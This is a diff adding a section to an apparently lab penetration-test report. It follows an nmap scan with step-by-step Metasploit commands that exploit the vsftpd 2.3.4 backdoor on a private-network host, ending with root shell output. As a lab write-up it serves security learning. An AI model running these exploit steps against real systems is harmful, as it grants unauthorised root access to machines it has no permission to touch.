@@ -134,3 +134,25 @@ Nmap done: 1 IP address (1 host up) scanned in 280.97 seconds
 **Command:**
 ```bash
 sudo nmap -sV -p- -A 192.168.10.100
+
+---
+
+### 2. Exploitation: vsftpd 2.3.4 Backdoor (Port 21)
+
+**Vulnerability:** vsftpd version 2.3.4 contained a malicious backdoor intended for remote shell access.
+
+**Tool:** Metasploit Framework (`msfconsole`)
+**Module Used:** `exploit/unix/ftp/vsftpd_234_backdoor`
+
+**Steps Taken:**
+
+1.  Opened `msfconsole`.
+2.  Set exploit module: `use exploit/unix/ftp/vsftpd_234_backdoor`
+3.  Set target: `set RHOSTS 192.168.10.100`
+4.  Executed: `exploit`
+
+**Proof of Exploit (Command Execution):**
+```bash
+# Output from the successful shell
+whoami
+root
